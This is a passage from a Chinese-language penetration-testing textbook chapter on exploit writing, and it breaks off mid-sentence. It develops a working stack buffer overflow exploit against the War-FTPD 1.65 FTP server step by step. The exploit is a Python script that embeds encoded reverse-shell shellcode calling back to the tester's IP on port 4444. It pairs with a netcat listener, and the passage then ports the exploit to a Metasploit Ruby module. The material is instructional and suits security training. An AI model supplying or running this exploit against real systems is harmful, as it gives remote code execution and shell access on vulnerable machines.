  \n# 第 9 章\n\n# 漏洞利用脚本编写\n\n## 本章内容：\n\n• 使用 Python 构建漏洞利用程序\n• 创建 Metasploit 漏洞利用模块\n\
  • 利用 PHP 脚本\n• 跨站脚本攻击\n\n现在，我们已经在前面的第 2 章和第 5 章中介绍了 Python 和 PHP，接下来让我们看看如何将基本的渗透测试技能提升到更高层次。虽然我们使用的许多漏洞利用程序已经预先构建好，但有时我们想要超越基础。无论是向已有的漏洞利用程序中添加新的载荷，还是修复一个损坏的漏洞利用程序，我们都希望理解使用脚本语言构建漏洞利用程序的过程，以便在实际环境中有效应用。\n\
  \n本章首先介绍使用 Python 进行漏洞利用脚本编写，并将我们的 Python 脚本转换为更灵活的 Ruby 语言 Metasploit 模块。然后，我们将探讨使用\
  \ PHP 进行不同风格的 Web 攻击。尽管我们使用特定语言来涵盖这些主题，但到目前为止我们使用的大多数语言都可以用于实现这些类型的攻击。\n\n## 使用\
  \ Python 构建漏洞利用程序\n\nPython 是构建概念验证（POC）漏洞利用程序的热门语言。在 [exploit-db.com](http://exploit-db.com)（一个流行的在线数据库，包含供渗透测试人员使用的\
  \ POC 漏洞利用程序）上搜索 Python 即可找到示例。Python 的网络库以及快速原型开发能力是其成为漏洞利用程序语言的主要原因。在本节中，我们将为\
  \ War-FTPD 1.65 应用程序构建一个 POC 漏洞利用程序。提交过长的字符串作为用户名会导致该应用程序以可利用的方式崩溃。我们将从首次崩溃到可用的漏洞利用程序，逐步检查漏洞利用程序的创建过程。\n\
  \n### 获取软件\n\n为此，我们将使用不带任何服务包的 Windows XP 来演示我们的漏洞利用程序。我们选择这个平台是因为该漏洞利用程序的可靠性和相对简单性。我们可以演示更复杂或更不可靠的漏洞利用程序，但当漏洞利用程序不可靠时，很难判断代码是否正常工作。为了学习基础知识，保持漏洞利用程序的简单性似乎是个好主意。\n\
  \n此外，我们还需要另外两个软件：War-FTPD 软件和 Immunity Debugger。War-FTPD 是一个 FTP 服务器，可以从 [www.warftp.org/files/1.6_Series/ward165.exe](http://www.warftp.org/files/1.6_Series/ward165.exe)\
  \ 下载。我们将使用 War-FTPD 1.65 版进行此练习。下载应用程序后，运行它以提取安装文件，然后运行该安装文件来安装应用程序。第二个应用程序 Immunity\
  \ Debugger 是一个强大的 Windows 运行时调试器。它具有其他调试器（如 OllyDbg 和 WinDbg）的功能，同时还具备 Python 脚本能力，允许使用辅助脚本和插件进行调试和漏洞利用开发。你可以从\
  \ [www.immunitysec.com/products-immdbg.shtml](http://www.immunitysec.com/products-immdbg.shtml)\
  \ 下载 Immunity Debugger。下载完成后，运行可执行文件安装 Immunity Debugger，如果尚未安装 Python，则同时安装 Python。\n\
  \n### 设置调试环境\n\n接下来，在我们的 Windows XP 机器上，我们需要设置调试器以捕获应用程序崩溃的相关信息。让我们通过单击桌面上的应用程序图标来启动\
  \ Immunity Debugger。启动后，选择 **文件 | 打开**。然后导航到 `C:\\Program Files\\War-ftpd\\war-ftpd.exe`\
  \ 并选择 **打开**。图 9.1 显示了 Immunity Debugger 软件的初始视图。\n\n![image](img/F000096f09-01-9781597497299.jpg)\n\
  \n图 9.1 Immunity Debugger 的初始视图\n\n查看图 9.1，本章将引用其中的几个区域。应用程序加载后，根据右下角的状态，我们看到它处于暂停状态。一旦应用程序在调试器中加载完成，我们必须运行它。\n\
  \n图 9.1 中的视图是 CPU 视图。CPU 视图有三个主要区域：指令区域，我们可以看到接下来将要执行的指令；寄存器区域，我们可以看到 `EIP` 寄存器（也称为指令指针）中当前指令的地址以及\
  \ `ESP` 寄存器（也称为堆栈指针）中堆栈的地址；以及堆栈区域，我们可以看到堆栈的内容。堆栈的内容显示在图 9.1 的右下角面板中。我们使用它来验证我们是否将数据写入到堆栈中足够深的位置，以便存储可执行代码。\n\
  \n注意\n\n\n\n\n\n在本章中，我们仅仅开始触及漏洞利用编写基础知识的皮毛。为了更好地理解这一主题，了解寄存器和基本的汇编语言知识会很有帮助。有许多书籍专门讲解漏洞利用编写，因此不可能仅通过这一章就成为专家。要学习更多关于漏洞利用编写的知识，找一本阅读风格舒适的书籍，并通读该手册。要了解最新的技术，可以阅读\
  \ Corelan 团队撰写的关于漏洞利用编写基础和新技术的文章。你可以在[`www.corelan.be/index.php/articles/`](https://www.corelan.be/index.php/articles/)找到这些优秀的文章。\n\
  \n一旦我们确认应用程序已加载，我们通过点击**启动**按钮或按下**F9**键来启动它。右下角的状态应变为“运行中”，并且我们应该会看到 War-FTPD 的启动画面，如图\
  \ 9.2 所示。\n\n![image](img/F000096f09-02-9781597497299.jpg)\n\n图 9.2 War-FTPD 启动画面\n\
  \n在开始构建漏洞利用之前，我们需要确保服务器正在运行。为此，我们点击闪电图标并查看主窗口。我们应该会看到离线状态变为“在线”。这意味着我们的服务器已准备就绪。我们可以开始构建漏洞利用了。\n\
  \n### 引发第一次崩溃\n\n现在我们的应用程序正在运行，是时候检查它是否存在漏洞了。我们通过使其崩溃并观察调试器中发生的情况来做到这一点。构建漏洞利用的第一步通常是发送大量易于识别的字符。在这种情况下，字母*A*应该是一个有效的用户名，所以如果一个字母*A*没问题，那么我们就发送\
  \ 1024 个。正如我们在第 4 章中学到的，*A*的十六进制值是 41，因此如果它们出现在输出中，我们应该能够识别出一系列 41。\n\n```\n#!/usr/bin/python\n\
  \nimport sys\n\nimport socket\n\nhostname = sys.argv[1]\n\nusername = \"A\"*1024\n\
  \npasswd = \"anything\"\n```\n\n首先，我们导入`sys`和`socket`，以便在脚本中使用标准参数和套接字。我们将主机名设置为脚本中的第一个也是唯一的参数。这将允许我们在需要时在其他地方使用我们的脚本。我们的用户名是\
  \ 1024 个字母*A*。密码可以是任何内容，因此我们将其设置为 anything。现在让我们继续看脚本的下一部分代码。\n\n```\nsock = socket.socket(socket.AF_INET,\
  \ socket.SOCK_STREAM)\n\ntry:\n\n   sock.connect((hostname, 21))\n\nexcept:\n\n\
  \   print (\"[-] Connection error!\")\n\n   sys.exit(1)\n\nr = sock.recv(1024)\n\
  \nprint \"[+] \" + r\n```\n\n接下来，我们需要连接到服务器。我们使用`socket`类的`socket`方法创建一个 TCP 套接字，指定我们将使用\
  \ INET（互联网套接字）和 STREAM（面向连接的协议）。`sock`方法返回一个传输控制协议/互联网协议（TCP/IP）套接字，我们可以用它来连接到主机。我们使用该套接字的`connect`方法，传入一个包含主机名和端口的元组。通过将其包裹在我们在第\
  \ 2 章中学到的错误处理中，我们确保如果连接失败，可以打印出有用的错误信息并退出。最后，为了确保我们已连接，我们从套接字读取横幅并将其打印到屏幕上。接下来，让我们看看如何将用户名和密码通过网络发送到我们的测试\
  \ FTP 服务器。\n\n```\nsock.send(\"user %s\\r\\n\" %username)\n\nr = sock.recv(1024)\n\
  \nprint \"[+] \" + r\n\nsock.send(\"pass %s\\r\\n\" %passwd)\n\nr = sock.recv(1024)\n\
  \nprint \"[+] \" + r\n\nsock.close()\n```\n\nFTP 登录序列使用`user`关键字来指示它应接收用户名。我们发送`user`命令以及我们长长的用户名字符串。我们读取服务器的响应并将其打印到屏幕上。然后我们发送虚假密码并读取响应。至此，我们应该已经登录失败，然后我们继续关闭套接字，因为除了测试脚本之外，没有其他有趣的事情可做了。\n\
  \n现在我们已经构建好脚本，让我们将其命名为`exploit.py`，并使用 FTP 服务器的 IP 地址运行它。我们应该会看到如图 9.3 所示的输出。\n\n\
  ![image](img/F000096f09-03-9781597497299.jpg)\n\n图 9.3 exploit.py 的执行\n\n虽然看起来 FTP\
  \ 服务器只是拒绝了我们的访问，但实际上它给了我们一个访问违规。当我们查看调试器时，我们看到了访问违规，并且状态已暂停。查看图 9.4，我们看到我们的`EIP`指针现在被\
  \ 41414141（四个*A*）覆盖。这意味着我们以一种可以覆盖`EIP`指针的方式使应用程序崩溃。请记住，这是执行指针，因此如果我们用一个有效地址来这样做，我们就可以控制应用程序。再次查看图\
  \ 9.4，我们看到我们的`ESP`指针中也包含*A*。因此，我们至少有两个寄存器可以用来构建漏洞利用。我们不知道的是每个指针在缓冲区中的相对位置。让我们通过漏洞利用代码来弄清楚这一点。\n\
  \n![image](img/F000096f09-04-9781597497299.jpg)\n\n图 9.4 第一次崩溃后的寄存器\n\n### 使用 pattern_offset\n\
  \nMetasploit 有两个在漏洞利用开发过程中经常使用的辅助脚本。第一个是`pattern_create.rb`，可以在`/pentest/exploits/framework3/tools`中找到。这个脚本接受一个参数：我们想要创建的缓冲区的长度。第二个是`pattern_offset.rb`，这个工具会接收`pattern_create.rb`的输出，并返回应用程序崩溃时`EIP`的位置。通过指定\
  \ 1024 作为`pattern_create`的长度（与我们最初指定的*A*的数量相同），我们将生成一个字符串，用于找到`EIP`覆盖的确切长度。该字符串包含一个唯一序列的字符，允许我们将`EIP`的值输入到另一个脚本中，以确定`EIP`被覆盖的确切长度。我们将`pattern_create`输出的字符串放入我们的用户名变量中。\n\
  \n```\nhostname = sys.argv[1]\n\nusername = \"\"\"\"\
  \"\"\n\npasswd = \"anything\"\n```\n\n我们的新代码替换了原始脚本中的用户名。在测试新代码之前，我们必须重新启动 FTP 进程。在调试器中，我们转到**调试**并选择**重新启动**。它会询问我们是否真的要这样做，我们选择**是**。我们再次运行进程，并点击\
  \ War-FTPD 中的**闪电图标**以确保应用程序在线。我们准备好测试新代码了。我们再次运行漏洞利用代码，并查看寄存器。图 9.5 显示了结果。\n\n\
  ![image](img/F000096f09-05-9781597497299.jpg)\n\n图 9.5 EIP 被我们的模式覆盖\n\n\n\n\n\n\
  正如我们在图 9.5 中所见，`EIP` 现在已被 32714131 覆盖，而不是 41414141（我们的 *A*）。我们也可以在 `ESP` 寄存器中看到新字符串的一部分。现在，我们可以获取\
  \ `EIP` 的值，并使用 `pattern_offset.rb` 脚本来确定缓冲区长度。`pattern_offset.rb` 脚本同样位于 `/pentest/exploit/framework3/tools`\
  \ 目录下，它接受一个参数：我们的 `EIP` 值。当我们使用 `EIP` 运行 `pattern_offset` 时，如图 9.6 所示，可以看到 `EIP`\
  \ 在用户名字符串的第 485 个字符处被覆盖。\n\n![image](img/F000096f09-06-9781597497299.jpg)\n\n图 9.6\
  \ 使用 EIP 值运行 pattern_offset 的输出\n\n### 控制 EIP\n\n现在我们知道需要覆盖多少个字符才能控制 `EIP`。我们需要验证是否正确。为此，我们构建漏洞利用字符串，使得在\
  \ `EIP` 覆盖之前的原始漏洞字符为 *A*，`EIP` 覆盖部分为 *B*，而漏洞缓冲区的其余部分由 *C* 组成。\n\n```\nhostname =\
  \ sys.argv[1]\n\nusername = \"A\"^∗485 + \"BBBB\" + \"C\"^∗(1024 - 485 - 4)\n\n\
  passwd = \"anything\"\n```\n\n我们构建新的用户名来验证偏移量。我们使用 485 个 *A*，用四个 *B* 覆盖 `EIP`，并用\
  \ *C* 填充 1024 缓冲区剩余的部分。我们需要确保缓冲区保持 1024 个字符。如果变长或变短，可能会改变漏洞利用的工作方式。为了确保长度不变，我们将\
  \ *C* 的数量乘以缓冲区长度减去 *A* 的数量和四个 *B* 的字节数。当脚本再次运行时，我们应该只在 `EIP` 寄存器中看到 *B*。\n\n一旦我们使用更新后的用户名执行代码，就会看到\
  \ `EIP` 被 42424242（即四个 *B*）覆盖。请参见图 9.7 中的示例。这表明我们的偏移量是正确的。此外，堆栈中充满了 43（即 *C*）。堆栈与我们预期的一致。我们可以滚动查看\
  \ *C* 以了解我们有多少空间。滚动时，我们看到缓冲区的其余部分位于堆栈中，为我们提供了 1024 缓冲区中剩余的空间用于漏洞代码。现在我们知道缓冲区的布局，但还有另一个问题：我们应该在\
  \ `EIP` 中放入什么来执行代码？\n\n![image](img/F000096f09-07-9781597497299.jpg)\n\n图 9.7 验证\
  \ EIP 偏移量\n\n我们知道漏洞代码将位于 `ESP` 中。因此，最好的办法是找到允许我们跳转到 `ESP` 的代码。该指令的汇编调用是 `JMP ESP`。我们可以使用其他模块中的现有代码来执行此指令；只需找到它即可。为此，我们首先进入调试器，选择\
  \ **View** 选项卡，然后选择 **Executable modules**。将弹出一个包含可执行模块的新窗口。常用于漏洞利用的一个模块是 `ntdll.dll`。双击此模块后，我们将进入\
  \ CPU 窗口。要找到 `JMP ESP` 命令，我们按 **Ctrl + f** 并输入 `JMP ESP`。我们定位到地址 `77F5801C` 处的指令。\n\
  \n让我们验证此指令是否有效。我们需要构建一个漏洞利用缓冲区，以便能够查看指令是否成功。但我们需要一种简单的方法来停止应用程序，以便查看它是否有效。一种方法是使用软件中断汇编命令\
  \ `INT 3`。该命令的十六进制值为 `0xCC`。通过在漏洞利用缓冲区中放置 `0xCC` 而不是字符 *C*，我们可以使程序停止，如果 `JMP ESP`\
  \ 命令有效，我们应该会在指令窗口中看到一堆 `INT 3` 命令。\n\n```\nhostname = sys.argv[1]\n\njmpesp = \"\
  \\x1c\\x80\\xf5\\x77\"\n\nusername = \"A\"^∗485 + jmpesp + \"\\xcc\"^∗(1024 - 485\
  \ - 4)\n\npasswd = \"anything\"\n```\n\n我们更新脚本，创建一个 `jmpesp` 变量来存储 `JMP ESP` 地址。由于\
  \ x86 平台是小端序，我们必须按相反顺序放入 `JMP ESP` shellcode。这使得 `0x77f5801c` 变为 `0x1c80f577`。接下来，我们更新用户名，将\
  \ B 替换为 `jmpesp`，将 C 替换为 `INT 3` 指令（`0xCC`）。我们准备再次运行代码。重新运行脚本时，我们看到活动指令是 `INT3`\
  \ 命令，堆栈中充满了 `0xCC` 字符，并且由于我们的代码执行，应用程序已暂停。\n\n注意\n\n术语*小端序*不应让人联想到微小的圆锥形帐篷和水牛。这是计算机科学家用来定义硬件读取数据顺序的术语。在大端序格式中（如果有小端序，那也应该有大端序，对吧？），数据从左到右读取。对于小端序，顺序是相反的！在我们的示例中，请注意我们并没有完全反转字符串；而是保留了数字对，并翻转了它们的顺序。这些对就是字节。我们改变序列中字节的顺序以反转它，但不会反转字节本身。例如，ABCD\
  \ 不会变成 DCBA，而是变成 CDAB。\n\n图 9.8 展示了我们能够在应用程序中执行任意代码。命令窗口中充满了 `0xCC` `INT 3` 命令，这表明应用程序已成功遵循跳转指令，并落入了我们插入的\
  \ `0xCC` 指令中。我们可以成功地将应用程序的执行重定向到运行我们自己的自定义代码。\n\n![image](img/F000096f09-08-9781597497299.jpg)\n\
  \n图 9.8 成功控制 EIP 以执行我们的代码\n\n### 添加 shellcode\n\n现在我们已经控制了应用程序的执行，是时候向脚本中添加自定义 shellcode\
  \ 了。这将允许我们在应用程序中执行任意代码。这意味着，如果我们的应用程序以管理员身份在机器上运行，我们的代码将拥有相同的权限。遗憾的是，shellcode 不会从树上长出来，因此我们必须生成它。\n\
  \n注意\n\n当我们提到 shellcode 时，指的是我们注入到进程中的代码。这种代码通常会导致对机器的 shell 访问，但该术语通常用于描述我们将注入到应用程序中的任何二进制代码。当我们构建漏洞利用时，执行\
  \ shellcode 是获得远程系统访问权限的最后步骤之一。我们通过重定向被利用应用程序的执行来执行 shellcode，使其执行任意指令。我们的 shellcode\
  \ 由这些指令组成。\n\nMetasploit 框架有两个脚本可以帮助我们将 shellcode 添加到漏洞利用中：`Msfpayload` 和 `Msfencode`。`Msfpayload`\
  \ 帮助使用 Metasploit 框架中的 payload 构建 shellcode 和应用程序。这使我们能够生成一个反向 shell payload。反向\
  \ shell 会从目标机器连接到我们。问题在于 shellcode 中可能包含与我们的 FTP 程序不兼容的字符。例如，换行符和空字符通常会破坏基于文本的漏洞利用。我们需要一种方法来编码我们的\
  \ payload，以便不包含这些字符。`Msfencode` 就是我们的解决方案。通过将这些字符指定为坏字符，我们将确保 `Msfencode` 以计算机能够解码并仍然运行的方式编码我们的\
  \ payload。\n\n首先，我们需要选择一个 payload。我们将使用 `windows/shell_reverse_tcp` payload。此 payload\
  \ 需要一个参数：本地主机（`LHOST`）。我们的 `LHOST` 是我们的 IP 地址。在本例中，它是 192.168.1.11。这告诉我们的 shell\
  \ 在运行时回调到哪里。由于我们将在 payload 返回后对输出进行编码，因此我们需要输出为原始形式。\n\n```\nmsfpayload windows/shell_reverse_tcp\
  \ LHOST = 192.168.1.11 R | msfencode –b ’\\x00\\x0e\\x40\\x0d’\n```\n\n一旦我们使用命令\
  \ `msfpayload` 输出原始代码，我们就使用 `msfencode` 命令用我们指定的坏字符对二进制文件进行编码。在本例中，我们排除了空字符、移出字符、@\
  \ 和回车符，这些是常见的会使 FTP 混淆的字符。\n\n提示\n\n\n\n\n有关识别坏字符的更多信息，请参考 Metasploit 维基条目：[`en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars`](http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit%23Dealing_with_badchars)。\n\
  \n此命令输出的结果就是我们 Python 脚本所需的 shellcode。我们还有最后一个障碍需要克服。虽然 Python 是构建漏洞利用的流行脚本语言，但\
  \ Metasploit 没有提供 Python 输出格式。我们将采用默认输出，删除每行末尾的 `+` 符号，并将 shellcode 包裹在圆括号中。让我们看看最终的\
  \ shellcode。\n\n```\n#!/usr/bin/python\n\nimport sys\n\nimport socket\n\nhostname\
  \ = sys.argv[1]\n\n# Found JMP ESP in ntdll.dll \"77F5801C\"\n\njmpesp = \"\\x1c\\\
  x80\\xf5\\x77\"\n\n# windows/shell_reverse_tcp - 314 bytes\n\n# [`www.metasploit.com`](http://www.metasploit.com)\n\
  \n# LHOST=192.168.1.11, LPORT=4444, ReverseConnectRetries = 5,\n\n# EXITFUNC=process,\
  \ InitialAutoRunScript=, AutoRunScript=\n\npayload = (\n\n\"\\xdb\\xde\\xbe\\x23\\\
  x6d\\x90\\xee\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\"\n\n\"\\xb1\\x4f\\x31\\x72\\x19\\\
  x83\\xc2\\x04\\x03\\x72\\x15\\xc1\\x98\\x6c\"\n\n\"\\x06\\x8c\\x63\\x8d\\xd7\\xee\\\
  xea\\x68\\xe6\\x3c\\x88\\xf9\\x5b\\xf0\"\n\n\"\\xda\\xac\\x57\\x7b\\x8e\\x44\\xe3\\\
  x09\\x07\\x6a\\x44\\xa7\\x71\\x45\"\n\n\"\\x55\\x06\\xbe\\x09\\x95\\x09\\x42\\x50\\\
  xca\\xe9\\x7b\\x9b\\x1f\\xe8\"\n\n\"\\xbc\\xc6\\xd0\\xb8\\x15\\x8c\\x43\\x2c\\x11\\\
  xd0\\x5f\\x4d\\xf5\\x5e\"\n\n\"\\xdf\\x35\\x70\\xa0\\x94\\x8f\\x7b\\xf1\\x05\\x84\\\
  x34\\xe9\\x2e\\xc2\"\n\n\"\\xe4\\x08\\xe2\\x11\\xd8\\x43\\x8f\\xe1\\xaa\\x55\\x59\\\
  x38\\x52\\x64\"\n\n\"\\xa5\\x96\\x6d\\x48\\x28\\xe7\\xaa\\x6f\\xd3\\x92\\xc0\\x93\\\
  x6e\\xa4\"\n\n\"\\x12\\xe9\\xb4\\x21\\x87\\x49\\x3e\\x91\\x63\\x6b\\x93\\x47\\xe7\\\
  x67\"\n\n\"\\x58\\x0c\\xaf\\x6b\\x5f\\xc1\\xdb\\x90\\xd4\\xe4\\x0b\\x11\\xae\\xc2\"\
  \n\n\"\\x8f\\x79\\x74\\x6b\\x89\\x27\\xdb\\x94\\xc9\\x80\\x84\\x30\\x81\\x23\"\n\
  \n\"\\xd0\\x42\\xc8\\x2b\\x15\\x78\\xf3\\xab\\x31\\x0b\\x80\\x99\\x9e\\xa7\"\n\n\
  \"\\x0e\\x92\\x57\\x61\\xc8\\xd5\\x4d\\xd5\\x46\\x28\\x6e\\x25\\x4e\\xef\"\n\n\"\
  \\x3a\\x75\\xf8\\xc6\\x42\\x1e\\xf8\\xe7\\x96\\xb0\\xa8\\x47\\x49\\x70\"\n\n\"\\\
  x19\\x28\\x39\\x18\\x73\\xa7\\x66\\x38\\x7c\\x6d\\x11\\x7f\\xeb\\x4e\"\n\n\"\\x8a\\\
  x7e\\xe7\\x26\\xc9\\x80\\xe6\\xea\\x44\\x66\\x62\\x03\\x01\\x31\"\n\n\"\\x1b\\xba\\\
  x08\\xc9\\xba\\x43\\x87\\x59\\x5e\\xd1\\x4c\\x99\\x29\\xca\"\n\n\"\\xda\\xce\\x7e\\\
  x3c\\x13\\x9a\\x92\\x67\\x8d\\xb8\\x6e\\xf1\\xf6\\x78\"\n\n\"\\xb5\\xc2\\xf9\\x81\\\
  x38\\x7e\\xde\\x91\\x84\\x7f\\x5a\\xc5\\x58\\xd6\"\n\n\"\\x34\\xb3\\x1e\\x80\\xf6\\\
  x6d\\xc9\\x7f\\x51\\xf9\\x8c\\xb3\\x62\\x7f\"\n\n\"\\x91\\x99\\x14\\x9f\\x20\\x74\\\
  x61\\xa0\\x8d\\x10\\x65\\xd9\\xf3\\x80\"\n\n\"\\x8a\\x30\\xb0\\xb1\\xc0\\x18\\x91\\\
  x59\\x8d\\xc9\\xa3\\x07\\x2e\\x24\"\n\n\"\\xe7\\x31\\xad\\xcc\\x98\\xc5\\xad\\xa5\\\
  x9d\\x82\\x69\\x56\\xec\\x9b\"\n\n\"\\x1f\\x58\\x43\\x9b\\x35\"\n\n)\n\nusername\
  \ = \"A\"^∗485 + jmpesp + \"\\x90\"^∗16 + payload + \"A\"^∗(1024 - 485 - 20 - len(payload))\n\
  \npasswd = \"anything\"\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
  \ntry:\n\n   sock.connect((hostname, 21))\n\nexcept:\n\n   print (\"[-] Connection\
  \ error!\")\n\n   sys.exit(1)\n\nr = sock.recv(1024)\n\nprint \"[+] \" + r\n\nsock.send(\"\
  user %s\\r\\n\" %username)\n\nr = sock.recv(1024)\n\nprint \"[+] \" + r\n\nsock.send(\"\
  pass %s\\r\\n\" %passwd)\n\nr \" sock.recv(1024)\n\nprint \"[+] \" + r\n\nsock.close()\n\
  ```\n\n我们已经用 shellcode 更新了漏洞利用代码，并修改了 `username` 字段。`username` 字段现在包含更新后的漏洞利用字符串。用户名以\
  \ 485 个 `A` 字符开头，用于溢出缓冲区，接着是 `jmpesp` 变量，其中包含使应用程序跳转到我们 shellcode 的地址。然后，我们包含 16\
  \ 个 `0x90` 字符（即 `NOP` 字符）。`NOP` 是一条指令，告诉处理器什么也不做，直接执行下一条指令。这为我们提供了一点额外空间，这样当我们跳转到\
  \ `ESP` 指针时，可以确保计算正确。这是构建漏洞利用时的标准做法，以确保偏移四五个字符不会导致问题。\n\n### 获取 Shell\n\n我们现在有了一个可用的漏洞利用程序。要使用它，我们只需设置一个监听器。对于监听器，我们将使用\
  \ `Netcat` 来接受传入连接。我们的反向 shell 将通过 4444 端口与我们通信，因此我们需要在该端口上监听。图 9.9 显示了监听器启动的情况。`-vvv`\
  \ 选项表示 `Netcat` 应输出非常详细的信息，并显示有关传入连接的信息。`-p` 选项指定要监听的端口，`-l` 选项表示 `Netcat` 应充当服务器。执行\
  \ `netcat` 命令后，我们重新启动 War-FTPD 并再次运行漏洞利用程序。\n\n![image](img/F000096f09-09-9781597497299.jpg)\n\
  \n图 9.9 最终 War-FTPD 漏洞利用成功返回 Shell\n\n我们在监听器窗口中看到来自 192.168.1.7 的传入连接，以及一个 Windows\
  \ XP shell。我们的漏洞利用成功，shellcode 运行成功。现在我们拥有了运行 War-FTPD 的用户上下文下的 shell，可以继续进行后渗透利用；第\
  \ 10 章 将描述如何提升权限、添加自己的用户等。\n\n## 创建 Metasploit 漏洞利用模块\n\n我们已经创建了一个 Python 漏洞利用程序，但它不够动态。我们如何随机化\
  \ `NOP` 字符并支持多种 payload 类型？Metasploit 框架通过多种方式简化了漏洞利用模块的创建任务。借助 Ruby 类和混入（mix-ins），我们可以创建自己的漏洞利用类，其中包含支持\
  \ FTP 所需的大部分功能。由于大部分工作已经为我们完成，我们只需创建自己的类并填写漏洞利用细节。\n\n提示\n\nMetasploit 框架功能丰富，拥有许多有助于渗透测试活动的工具。其中许多功能简单明了，而另一些则有一定的学习曲线。Offensive\
  \ Security 团队意识到了这一点，并创建了一个名为 Metasploit Unleashed 的免费课程。要了解更多关于 Metasploit Unleashed\
  \ 的信息，请访问课程网页：[www.offensive-security.com/metasploit-unleashed](http://www.offensive-security.com/metasploit-unleashed)。\n\
  \n### 创建模板\n\n创建 Metasploit 漏洞利用模块的第一步是创建我们的类和初始化方法。初始化方法中的信息包括模块名称、描述、payload 参数以及漏洞利用目标的信息。让我们通过构建一个初始模板来开始构建我们的类。\n\
  \n注意\n\n本示例中使用的模板是 Metasploit 框架提供的模板的修改版本。你可以在 `/pentest/exploits/framework3/documentation/samples/modules/exploits/`\
  \ 目录中找到完整的模板。随着 Metasploit 添加新功能，该模板也会更新。因此，如果某个模块在使用示例模板时无法正常工作，请首先参考 Metasploit\
  \ 提供的模板。\n\n```\nrequire ’msf/core’\n\nclass Metasploit3 < Msf::Exploit::Remote\n\
  \n   Rank = AverageRanking\n\n   include Msf::Exploit::Remote::Ftp\n\n   def initialize(info\
  \ = {})\n\n     super(update_info(info,\n\n       ’Name’ = > ’War-FTPD 1.65 Username\
  \ Exploit’,\n\n       ’Description’ = > %q{\n\n         This module exploits the\
  \ USER command in War-FTPD 1.65\n\n     },\n\n       ’License’ = > BSD_LICENSE,\n\
  \n       ’Payload’ = >\n\n         {\n\n           ’Space’ = > 524,\n\n           ’BadChars’\
  \ = > \"x00\\x0a\\x0d\\x40\",\n\n           ’StackAdjustment’ = > - 3500,\n\n         },\n\
  \n       ’Platform’ = > ’win’,\n\n       ’Targets’ = >\n\n         [\n\n           [\n\
  \n             ’Windows XP SP0’,\n\n             {\n\n               ’Ret’ = > 0x77f5801c\
  \ # ntdll.dll\n\n             },\n\n           ],\n\n         ],\n\n         ’DefaultTarget’\
  \ = > 0,\n\n       ))\n\n     end\n\n     def exploit\n\n     end\n\nend\n```\n\n\
  \n\n\n这是生成模块所需的基本模板。我们引入了 `msf/core` 模块，以便访问所有 Metasploit 框架代码。接着，我们扩展了 `Msf::Exploit::Remote`\
  \ 类，创建了一个新的 `Metasploit3` 类。通过扩展该类，我们获得了处理套接字和网络数据编码的辅助函数。然后，我们从 `Msf::Exploit::Remote::Ftp`\
  \ 中引入了模块代码，以获取关键的协议函数（如 `connect`）和选项（如 `RHOST`（远程主机）和 `RPORT`（远程端口））。我们还可以重用 `Msf::Exploit::Remote::Ftp`\
  \ 类的代码。现在，所有外部代码都已引入，我们设置了初始化方法，该方法将在类加载时被调用。\n\n在我们的初始化方法中，`super` 方法会将 `update_info`\
  \ 方法的输出传递给底层类，以确保类的设置正确。`update_info` 方法会用特定于我们漏洞利用的信息来更新模块的默认信息。我们向 `update_info`\
  \ 方法传递了两部分信息：一是调用初始化方法时传入的 `info` 哈希，二是我们想要更新的额外信息的键值对数据。\n\n这些键值对帮助我们定位模块，并告诉 Metasploit\
  \ 如何处理它。`name` 和 `description` 是我们查看漏洞利用信息时看到的内容。`license` 是我们希望模块发布的许可证。`payload`\
  \ 哈希包含告知 Metasploit 关于我们有效载荷的信息。我们的缓冲区长度为 1024 个字符。我们用了 500 个字符用于其他用途，因此有效载荷可以是\
  \ 524 个字符。我们提供了之前用于 `msfencode` 的坏字符，然后添加了一个 `StackAdjustment` 选项。`StackAdjustment`\
  \ 告诉 Metasploit 在有效载荷运行时调整堆栈，以便有足够的空间让有效载荷解码和执行。如果我们的有效载荷空间很大，可能不需要这个选项。但我们希望为有效载荷的执行争取尽可能多的空间。\n\
  \n`platform` 设置为 `win`，表示该漏洞利用针对 Windows 系统。`Targets` 数组是一个元组数组。每个元组包含平台名称和该平台的漏洞利用选项。在我们的例子中，我们有\
  \ Windows XP SP 0，其哈希包含我们从 `ntdll.dll` 获取的返回地址。最后一个键值对包含我们的 `DefaultTarget`，即 `Targets`\
  \ 数组中应作为漏洞利用默认目标的索引。\n\n### 移植漏洞利用代码\n\n现在我们已经设置好了初始化方法，是时候添加漏洞利用代码了。我们需要将用 Python\
  \ 编写的代码转换为使用 `Msf::Exploit::Remote::Ftp` 方法以及 Ruby 中的 Metasploit 结构。`exploit` 方法是在\
  \ Metasploit 中设置好变量后输入 `exploit` 时运行的。在进入该方法之前，我们应该已经设置好了所有需要的变量，因此模块不应再接受任何其他输入。\n\
  \n```ruby\ndef exploit\n  connect\n  print_status(\"Connecting to #{target.name}…\"\
  )\n  buf = make_nops(500) + payload.encoded\n  buf[485, 4] = [ target.ret ].pack('V')\n\
  \  print_status(\"Sending Exploit……\")\n  send_cmd(['USER', buf] , false)\n  handler\n\
  \  disconnect\nend\n```\n\n我们首先使用 `connect` 方法连接到目标主机。我们使用 Metasploit 模块方法 `print_status`\
  \ 将状态信息输出到接收输出的位置，并打印连接消息。接下来，我们使用 `make_nops` 方法构建漏洞利用缓冲区，创建 500 条随机空操作指令。这些 NOP\
  \ 指令替换了原始漏洞利用中使用的 `A`。我们将 `A` 替换为这些随机 NOP 字符，以在代码执行时规避简单的 IDS 签名匹配。我们创建了超过所需的 485\
  \ 个字符，这样在添加返回代码后就不必再额外添加。我们将用户选择并由 Metasploit 处理的编码有效载荷附加到漏洞利用缓冲区中。现在，我们将目标返回地址（该地址将执行\
  \ `JMP ESP` 命令）放入缓冲区的第 485 个字符位置。我们需要对这个值进行打包，使其转换为小端格式，这在我们的 Python 漏洞利用中是手动完成的。\n\
  \n现在我们已经有了漏洞利用字符串，打印一条状态消息，表示即将发送漏洞利用。最后，我们使用 `send_cmd` 方法发送一个 `USER` 命令，并将缓冲区作为参数。`false`\
  \ 选项表示我们不关心返回的数据。一旦缓冲区发送完毕，我们就不关心返回什么了。`handler` 方法处理有效载荷连接，`disconnect` 方法断开与服务器的连接。\n\
  \n我们的漏洞利用代码现已完成，我们有了一个可用的 Metasploit 模块。由于这是一个个人模块，我们将其保存在主目录下的 `.msf3` 目录中，以便在运行\
